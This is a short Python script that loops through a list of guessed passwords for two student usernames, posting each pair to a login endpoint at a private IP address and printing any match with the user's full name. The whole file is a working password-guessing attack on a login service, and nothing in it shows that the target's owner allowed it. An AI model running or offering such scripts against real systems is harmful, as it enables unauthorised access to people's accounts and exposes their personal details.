import urllib.request
import json

passwords = [
    "Password@123", "Password@1234", "Student@123", "Welcome@123", "Aarav@2026",
    "Pramaan@123", "Pramaan@2026", "Student@2025", "Password@2025", "12345678",
    "Admin@123", "dtu@123", "dtu_demo", "student_demo", "aarav_sharma", "password"
]
users = ["student_demo", "student_aarav"]

for u in users:
    for p in passwords:
        url = "http://10.31.11.118:8000/api/v1/auth/login"
        req = urllib.request.Request(
            url,
            data=json.dumps({
                "username": u,
                "password": p,
                "requested_role": "student"
            }).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        try:
            with urllib.request.urlopen(req) as resp:
                data = json.loads(resp.read().decode())
                print(f"FOUND PASSWORD FOR {u}: '{p}' -> Name: {data.get('user', {}).get('full_name')}")
                break
        except Exception:
            pass
